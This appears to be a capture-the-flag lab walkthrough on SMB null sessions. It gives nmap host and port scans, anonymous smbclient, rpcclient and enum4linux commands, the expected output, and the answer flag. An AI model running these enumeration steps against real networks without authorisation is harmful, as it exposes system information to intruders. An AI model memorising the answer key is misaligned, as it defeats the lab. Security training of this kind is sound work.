# Lab 2.5: SMB Null Session Connection

## Learning Objectives

- Connect to SMB using null session
- Understand null session enumeration techniques
- Capture the flag (found during null session enumeration)

## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before connecting.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify SMB service is running:**
   ```bash
   nmap -p 445 <target_ip>
   ```

### Step 2: Understand Null Sessions

A null session is an anonymous connection to SMB using empty credentials.

**Key Concepts:**
- **Null session**: Connection with empty username and password
- **IPC$ share**: Inter-Process Communication share (system share)
- **Purpose**: Used for enumeration without authentication
- **Security risk**: Can reveal system information if misconfigured

### Step 3: Connect with Null Session and Find Flag

Use smbclient to test null session connectivity. The flag is in the server string!

**Detailed Steps:**

1. **List shares with null session (reveals the flag!):**
   ```bash
   smbclient -L //<target_ip> -N
   ```
   
   Replace `<target_ip>` with your actual target IP.

   **Command breakdown:**
   - `smbclient`: SMB client tool
   - `-L`: List shares
   - `//<target_ip>`: Target server
   - `-N`: No password (null session)

2. **Expected output with flag:**
   ```
   Sharename       Type      Comment
   ---------       ----      -------
   IPC$            IPC       IPC Service (Windows Server - Null Session: OCR{smb_null_c0nn3ct})
   
   Workgroup            Master
   ---------            -------
   WORKGROUP
   ```

   **The flag is in the IPC$ service comment!**

3. **Alternative: Connect to IPC$ with null session:**
   ```bash
   smbclient //<target_ip>/IPC$ -N -U ""
   ```
   
   **Command breakdown:**
   - `-U ""`: Empty username (explicit null session)

4. **Alternative: Use rpcclient with null session:**
   ```bash
   rpcclient -U "" -N <target_ip>
   ```
   
   At the prompt, type `srvinfo` to see server information:
   ```
   rpcclient $> srvinfo
   ```

5. **Alternative: Use enum4linux:**
   ```bash
   enum4linux -a <target_ip>
   ```
   
   Look for the "Server Comment" in the output.

### Step 4: Verify Flag Format

**Flag format:**
```
OCR{smb_null_c0nn3ct}
```

**Success Criteria:**
- ✅ Verified target IP and SMB service accessibility
- ✅ Understood null session concept
- ✅ Successfully enumerated with null session using `smbclient -L`
- ✅ Found flag in the server string/IPC$ comment
- ✅ Verified flag format is correct: `OCR{...}`

## Common Mistakes

- Trying to download files instead of reading enumeration output
- Not understanding that null session reveals info through enumeration
- Missing the flag in the IPC$ service comment

## Hints for Struggling Students

1. Null session uses `-N` flag (no password)
2. Use `smbclient -L //<target_ip> -N` to enumerate
3. The flag is in the server comment (IPC$ line)
4. You don't need to access any files - just enumerate!
